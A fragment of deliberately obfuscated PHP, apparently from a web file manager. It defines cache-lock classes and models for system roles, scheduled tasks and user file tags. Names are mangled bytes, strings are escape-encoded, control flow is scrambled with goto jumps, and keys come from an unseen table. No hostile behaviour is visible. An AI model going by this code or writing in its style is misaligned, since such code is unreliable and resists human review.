$Då¤Œ‘ƒÉÓ = $b¦â™§Èâ–->setLock($Aä­¥Ë»¿Á, $fÁŸ’¡§‡¦, $dñ¸ÌÒÚ¤í); if ($Då¤Œ‘ƒÉÓ) { return !0; } } else { if ($eÅØÄ¶Âê™ < microtime(!0)) { $b¦â™§Èâ–->set($Aä­¥Ë»¿Á, $fÁŸ’¡§‡¦, $dñ¸ÌÒÚ¤í * 2); if ($b¦â™§Èâ–->get($Aä­¥Ë»¿Á) === $eÅØÄ¶Âê™) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($a…›ëŸ©ô¬) { return Cache::init()->get($a…›ëŸ©ô¬); } public function unlock($dÍ½Ú¦¨ø) { return Cache::init()->remove($dÍ½Ú¦¨ø); } } class CacheLockMemcached { public function lock($C¿´¡ô‰Í–, $bóŸ¹ÁÓ¬ = 0) { $c¥˜Î†òºî = Cache::init(); $E±å·â¥™ = microtime(!0) + $bóŸ¹ÁÓ¬; while (microtime(!0) < $E±å·â¥™) { $BÃ––¼Ûà = $c¥˜Î†òºî->get($C¿´¡ô‰Í–); if (!$BÃ––¼Ûà || $BÃ––¼Ûà < microtime(!0)) { $cµâ¦·ŞĞ = $c¥˜Î†òºî->handle->add($C¿´¡ô‰Í–, $E±å·â¥™, $bóŸ¹ÁÓ¬); if ($cµâ¦·ŞĞ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Bø×ÉÂŸòù) { return Cache::init()->get($Bø×ÉÂŸòù); } public function unlock($a‹ë´Ğˆ³Æ) { return Cache::init()->remove($a‹ë´Ğˆ³Æ); } } goto E«Š“®Ï“Ê; c¯˜„œö¶: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\x72\157\x6c\145\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\x74\x68", "\x6c\141\142\145\154", "\144\x69\163\x70\154\141\x79", "\x73\171\x73\164\x65\155", "\144\145\x73\143", "\x69\147\156\x6f\x72\x65\x45\x78\x74", "\151\x67\156\157\x72\145\x46\151\x6c\x65\x53\151\172\145", "\141\x64\x6d\151\156\151\x73\x74\x72\141\164\x6f\162", "\163\157\x72\164"); public function listData($BÆí˜çª¼… = false, $B²Ç˜²Ìè = "\x73\x6f\x72\164", $E×ô‘†›  = false) { $e‰È®”¼¡ =& $_SERVER[…ë˜õ]; $Bá†˜º° = parent::listData($BÆí˜çª¼…, $B²Ç˜²Ìè, $E×ô‘†› ); if (!$BÆí˜çª¼…) { foreach ($Bá†˜º° as $dØ‹•§•½ => $AÙŒ¶£ËÛ) { if ($AÙŒ¶£ËÛ[$e‰È®”¼¡[1885]] == 1) { $Bá†˜º°[$dØ‹•§•½][$e‰È®”¼¡[425]] = LNG($e‰È®”¼¡[2109]); } } } return $Bá†˜º°; } public function update($B¨ÃÕ˜âÖì, $fÛİˆ“‰à) { goto cáíß“Û¢; BÀ¤äá¼“°: if (!$CøóØ½¬ì‘ || $FÌâ°îó×Ë && $FÌâ°îó×Ë[$B°ËÎ‡Ö÷Â[388]] != $CøóØ½¬ì‘[$B°ËÎ‡Ö÷Â[388]]) { return !1; } if ($FÌâ°îó×Ë[$B°ËÎ‡Ö÷Â[1885]] == 1) { $fÛİˆ“‰à = array($B°ËÎ‡Ö÷Â[28] => $fÛİˆ“‰à[$B°ËÎ‡Ö÷Â[28]], $B°ËÎ‡Ö÷Â[1715] => $fÛİˆ“‰à[$B°ËÎ‡Ö÷Â[1715]]); } $this->filterAuth($fÛİˆ“‰à[$B°ËÎ‡Ö÷Â[400]]); goto DåÒÖ•Ùá; cáíß“Û¢: $B°ËÎ‡Ö÷Â =& $_SERVER[…ë˜õ]; $CøóØ½¬ì‘ = parent::listData($B¨ÃÕ˜âÖì); $FÌâ°îó×Ë = $this->findByName($fÛİˆ“‰à[$B°ËÎ‡Ö÷Â[28]]); goto BÀ¤äá¼“°; DåÒÖ•Ùá: return parent::update($B¨ÃÕ˜âÖì, $fÛİˆ“‰à); goto f‘Õ†šé–š; f‘Õ†šé–š: } public function remove($A²‹¨£ë¶¡) { $eØËï‘Å­É = parent::listData($A²‹¨£ë¶¡); if (!$eØËï‘Å­É || $eØËï‘Å­É[$_SERVER[…ë˜õ][1174]]) { return !1; } return parent::remove($A²‹¨£ë¶¡); } public function add($fùÔƒ¬Ë¦Á) { goto E‡ï¯ùÉó–; eíÜ£œæÜ: $A±¿‹õÑ‰ = array($EÙàÛ†›Ôƒ[407] => $Aä”ò¦™©–, $EÙàÛ†›Ôƒ[1700] => $EÙàÛ†›Ôƒ[33], $EÙàÛ†›Ôƒ[1696] => $EÙàÛ†›Ôƒ[1704], $EÙàÛ†›Ôƒ[2110] => 1, $EÙàÛ†›Ôƒ[1699] => 0, $EÙàÛ†›Ôƒ[2111] => 0, $EÙàÛ†›Ôƒ[1698] => $this->getSort()); $fùÔƒ¬Ë¦Á = array_merge($A±¿‹õÑ‰, $fùÔƒ¬Ë¦Á); $this->filterAuth($fùÔƒ¬Ë¦Á[$EÙàÛ†›Ôƒ[400]]); goto e¢Š…×Ü¦; e¢Š…×Ü¦: return parent::insert($fùÔƒ¬Ë¦Á); goto cÚé™ğßŞº; E‡ï¯ùÉó–: $EÙàÛ†›Ôƒ =& $_SERVER[…ë˜õ]; $Aä”ò¦™©– = $fùÔƒ¬Ë¦Á[$EÙàÛ†›Ôƒ[28]]; if ($this->findByName($Aä”ò¦™©–)) { return !1; } goto eíÜ£œæÜ; cÚé™ğßŞº: } private function getSort() { $F˜˜´ÇÛì =& $_SERVER[…ë˜õ]; $bóÅÂ»Šœ = parent::listData(); $B„Òí•ã­Î = array_to_keyvalue($bóÅÂ»Šœ, $F˜˜´ÇÛì[33], $F˜˜´ÇÛì[1717]); return empty($B„Òí•ã­Î) ? 0 : max($B„Òí•ã­Î) + 1; } private function filterAuth(&$aÀŒÖ„˜˜É) { $Bëî¬Ó¨Èö =& $_SERVER[…ë˜õ]; $D…ô…»Ë– = array(); $AòŒ‰ÚàÓ = array_filter(explode($Bëî¬Ó¨Èö[47], $aÀŒÖ„˜˜É)); foreach ($AòŒ‰ÚàÓ as $aÀŒÖ„˜˜É) { $Cò»ÖÇµÚø = explode($Bëî¬Ó¨Èö[94], $aÀŒÖ„˜˜É); if ($Cò»ÖÇµÚø[0] == $Bëî¬Ó¨Èö[2112] && $Cò»ÖÇµÚø[1] != $Bëî¬Ó¨Èö[1095]) { $b¹ò½´âä = $Cò»ÖÇµÚø[0] . $Bëî¬Ó¨Èö[94] . $Cò»ÖÇµÚø[1] . $Bëî¬Ó¨Èö[2113]; if (!in_array($b¹ò½´âä, $AòŒ‰ÚàÓ)) { $D…ô…»Ë–[] = $b¹ò½´âä; } } $D…ô…»Ë–[] = $aÀŒÖ„˜˜É; } $aÀŒÖ„˜˜É = implode($Bëî¬Ó¨Èö[47], $D…ô…»Ë–); } public function sort($E¶²‘î†Ÿ², $BçßİæˆÀ) { return parent::update($E¶²‘î†Ÿ², $BçßİæˆÀ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\164\141\x73\153\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\x74\x79\160\x65", "\x65\166\x65\156\164", "\164\x69\155\145", "\x64\145\163\x63", "\x73\x79\163\164\x65\x6d", "\x65\x6e\x61\142\x6c\x65", "\x6c\x61\x73\x74\x52\x75\x6e", "\163\157\x72\164"); public function listData($c¢äµ³ƒ¢¦ = false, $DˆÙÜÊŠ…ğ = "\163\157\x72\x74", $aÂ²ŞÑÕÃî = false) { return parent::listData($c¢äµ³ƒ¢¦, $DˆÙÜÊŠ…ğ, $aÂ²ŞÑÕÃî); } public function add($aÊàÃªÑù») { $d½³åÂ…àœ =& $_SERVER[…ë˜õ]; $cÒ¯©Âá¼µ = $this->findByName($aÊàÃªÑù»[$d½³åÂ…àœ[28]]); if ($cÒ¯©Âá¼µ) { return !1; } $aÊàÃªÑù»[$d½³åÂ…àœ[1495]] = 0; $aÊàÃªÑù»[$d½³åÂ…àœ[1717]] = $this->getSort(); return parent::insert($aÊàÃªÑù»); } private function getSort() { $AÕÆñ˜À­á =& $_SERVER[…ë˜õ]; $F¯à‹» ß§ = parent::listData(); $Bùİ§™ƒÒ = array_to_keyvalue($F¯à‹» ß§, $AÕÆñ˜À­á[33], $AÕÆñ˜À­á[1717]); return empty($Bùİ§™ƒÒ) ? 0 : max($Bùİ§™ƒÒ) + 1; } public function update($fğËá–¬ÌÑ, $fà×áÚçàµ) { $a£ø©éŸš® =& $_SERVER[…ë˜õ]; $fÛÅŠ‚Öñâ = $this->listData($fğËá–¬ÌÑ); $f…ˆ²Ÿµ°ö = $this->findByName($fà×áÚçàµ[$a£ø©éŸš®[28]]); if (!$fÛÅŠ‚Öñâ || $f…ˆ²Ÿµ°ö && $f…ˆ²Ÿµ°ö[$a£ø©éŸš®[388]] != $fÛÅŠ‚Öñâ[$a£ø©éŸš®[388]]) { return !1; } return parent::update($fğËá–¬ÌÑ, $fà×áÚçàµ); } public function remove($C¿äˆ«ğ˜î, $bÛ×ôËÂ»ô = false) { $DŞğùÀ©´Ó =& $_SERVER[…ë˜õ]; $Fòò’«Ä = $this->listData($C¿äˆ«ğ˜î); if (!$Fòò’«Ä) { return; } if (!$bÛ×ôËÂ»ô && $Fòò’«Ä[$DŞğùÀ©´Ó[1174]] == $DŞğùÀ©´Ó[86]) { return !1; } return parent::remove($C¿äˆ«ğ˜î); } public function enable($bÔ„¼•çÄ´, $CÖ®£ß¹Èã) { return $this->update($bÔ„¼•çÄ´, array($_SERVER[…ë˜õ][2104] => $CÖ®£ß¹Èã)); } public function run($cÕË¾øÂ¦ğ) { return $this->update($cÕË¾øÂ¦ğ, array($_SERVER[…ë˜õ][2114] => time())); } } goto B©Üğ¼Ÿİ; CƒÔÖÛÑçù: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($E¡Ü›¡È³) { $cÍİŠ =& $_SERVER[…ë˜õ]; return array($cÍİŠ[1798] => array(USER_ID, $cÍİŠ[1799])); } protected function listData() { $báÒ¢¦—™ =& $_SERVER[…ë˜õ]; $Bº”–¬¡å® = array($báÒ¢¦—™[1522] => USER_ID, $báÒ¢¦—™[457] => array($báÒ¢¦—™[1802], 0)); $c–ÆÎ†Ò›Ü = $báÒ¢¦—™[1804]; $Bóë‡Ò©âˆ = $this->field($c–ÆÎ†Ò›Ü)->where($Bº”–¬¡å®)->order($báÒ¢¦—™[1805])->select(); return $Bóë‡Ò©âˆ ? $Bóë‡Ò©âˆ : array(); } protected function listByTag($C””¾ôõµø) { } protected function addToTag($Dã‚ˆŞâ°¯, $C¤‹ÖÑÜ°) { $eŠ½‰‰Âˆ =& $_SERVER[…ë˜õ]; if (!Model($eŠ½‰‰Âˆ[1940])->listData($C¤‹ÖÑÜ°) || !Model($eŠ½‰‰Âˆ[796])->pathInfo($Dã‚ˆŞâ°¯)) { return !1; } $EœˆÇ°ÁâÑ = array($eŠ½‰‰Âˆ[1522] => USER_ID, $eŠ½‰‰Âˆ[457] => $C¤‹ÖÑÜ°, $eŠ½‰‰Âˆ[408] => $Dã‚ˆŞâ°¯, $eŠ½‰‰Âˆ[409] => $eŠ½‰‰Âˆ[403], $eŠ½‰‰Âˆ[407] => $eŠ½‰‰Âˆ[33], $eŠ½‰‰Âˆ[1698] => 0); if ($this->where($EœˆÇ°ÁâÑ)->find()) { return !1; } return $this->add($EœˆÇ°ÁâÑ); } protected function removeFromTag($aÎÃê¼ÇªÑ, $A‹´á§Ã—Á) { $a¹§Ò•Óñ¤ =& $_SERVER[…ë˜õ]; if (!Model($a¹§Ò•Óñ¤[1940])->listData($A‹´á§Ã—Á)) { return !1; } if (is_array($aÎÃê¼ÇªÑ)) { $aÎÃê¼ÇªÑ = array($a¹§Ò•Óñ¤[7], $aÎÃê¼ÇªÑ); } $BÔ¿Èíß©ï = array($a¹§Ò•Óñ¤[1522] => USER_ID, $a¹§Ò•Óñ¤[457] => $A‹´á§Ã—Á, $a¹§Ò•Óñ¤[409] => $a¹§Ò•Óñ¤[403], $a¹§Ò•Óñ¤[408] => $aÎÃê¼ÇªÑ); return $this->where($BÔ¿Èíß©ï)->delete(); } protected function removeByTag($CÑ´„À¬ÕÌ) { $AÒ Š‡Á°Ğ =& $_SERVER[…ë˜õ]; if (!$CÑ´„À¬ÕÌ) { return !1; } $AÊÉÇøÏ‹ = array($AÒ Š‡Á°Ğ[1522] => USER_ID, $AÒ Š‡Á°Ğ[457] => $CÑ´„À¬ÕÌ); return $this->where($AÊÉÇøÏ‹)->delete(); } protected function removeBySource($e©¬À¡‡‹) { $C‘¨ÁÜ³×İ =& $_SERVER[…ë˜õ]; if (is_array($e©¬À¡‡‹)) { $e©¬À¡‡‹ = array($C‘¨ÁÜ³×İ[7], $e©¬À¡‡‹); } $BÅŸÕ‘Œ­ = array($C‘¨ÁÜ³×İ[1522] => USER_ID, $C‘¨ÁÜ³×İ[408] => $e©¬À¡‡‹, $C‘¨ÁÜ³×İ[457] => array($C‘¨ÁÜ³×İ[977], 0)); return $this->where($BÅŸÕ‘Œ­)->delete(); } }